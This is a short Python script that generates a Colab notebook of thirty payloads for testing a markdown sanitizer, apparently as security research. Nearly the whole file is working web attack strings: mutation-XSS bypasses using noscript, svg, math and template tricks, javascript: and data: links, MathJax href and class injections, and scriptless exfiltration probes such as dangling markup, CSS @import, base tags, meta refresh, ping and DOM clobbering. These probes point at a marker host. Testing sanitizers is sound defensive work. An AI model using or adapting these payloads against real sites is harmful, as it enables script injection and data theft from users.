"""Throwaway: round-2 payloads for the colab-embedded markdown sanitizer (mXSS, MathJax, dangling markup, CSS).
Markers: alert('Q<n>:'+document.domain); exfil probes point at a benign marker host so requests are visible in logs."""
import json

def A(n):
    return f"alert('Q{n}:'+document.domain)"

MARK = "https://q-marker.invalid"  # never resolves; only visible as a request/attribute in the DOM dump

md = [
    # --- mutation XSS (sanitize -> serialize -> reparse) ---
    f"Q1 noscript <noscript><p title=\"</noscript><img src=x onerror={A(1)}>\"></noscript>",
    f"Q2 style-in-svg <svg></p><style><a id=\"</style><img src=x onerror={A(2)}>\">",
    f"Q3 math-mglyph <math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=x onerror={A(3)}&gt;\">",
    f"Q4 form-nesting <form><math><mtext></form><form><mglyph><style></math><img src=x onerror={A(4)}>",
    f"Q5 template <template><img src=x onerror={A(5)}></template>",
    f"Q6 xmp <xmp><img src=x title=\"</xmp><img src=x onerror={A(6)}>\"></xmp>",
    f"Q7 textarea <textarea><img title=\"</textarea><img src=x onerror={A(7)}>\"></textarea>",
    f"Q8 comment <!--><img src=x onerror={A(8)}>-->",
    f"Q9 cdata-in-svg <svg><![CDATA[><img src=x onerror={A(9)}>]]></svg>",
    # --- markdown parser vs sanitizer ---
    f"Q10 md autolink <javascript:{A(10)}>",
    f"Q11 md ref link [Q11][r]\n\n[r]: javascript:{A(11)}",
    f"Q12 md img alt ![\"><img src=x onerror={A(12)}>](x)",
    f"Q13 md entity [Q13](&#106;avascript:{A(13)})",
    f"Q14 md data url [Q14](data:text/html,<script>{A(14)}</script>)",
    # --- MathJax (renders after sanitize) ---
    "Q15 mj href $\\href{javascript:" + A(15) + "}{Q15}$",
    "Q16 mj class $\\class{x\" onmouseover=\"" + A(16) + "}{Q16}$",
    "Q17 mj style $\\style{background:url(" + MARK + "/q17)}{Q17}$",
    "Q18 mj cssId $\\cssId{x\"><img src=x onerror=" + A(18) + ">}{Q18}$",
    "Q19 mj require $\\require{unicode}\\unicode[" + MARK + "/q19]{x41}$",
    "Q20 mj toggle $\\toggle{Q20}{<img src=x onerror=" + A(20) + ">}\\endtoggle$",
    "Q21 mj mathml <math><maction actiontype=\"statusline\"><mtext>Q21</mtext><mtext>x</mtext></maction></math>",
    # --- data exfil without script ---
    f"Q22 dangling <img src='{MARK}/q22?",
    f"Q23 css <style>@import url({MARK}/q23);body{{background:url({MARK}/q23b)}}</style>",
    f"Q24 inline style <p style=\"background:url({MARK}/q24)\">Q24</p>",
    f"Q25 base <base href=\"{MARK}/q25/\"><a href=\"rel\">Q25</a>",
    f"Q26 meta refresh <meta http-equiv=\"refresh\" content=\"0;url={MARK}/q26\">",
    f"Q27 srcset <img srcset=\"{MARK}/q27 1x\">",
    f"Q28 link prefetch <link rel=prefetch href=\"{MARK}/q28\">",
    f"Q29 a ping <a href=\"https://example.com\" ping=\"{MARK}/q29\">Q29</a>",
    f"Q30 id clobber <img name=\"getElementById\"><a id=\"defaultConfig\" href=\"{MARK}/q30\">Q30</a>",
]
cells = [{"cell_type": "markdown", "metadata": {"id": f"q{i}"}, "source": [m]} for i, m in enumerate(md)]
nb = {"nbformat": 4, "nbformat_minor": 0, "metadata": {"colab": {"name": "render_test2.ipynb", "provenance": []}}, "cells": cells}
json.dump(nb, open("/tmp/gcpmap/nbtest/render_test2.ipynb", "w"), indent=1)
print(len(cells), "cells")
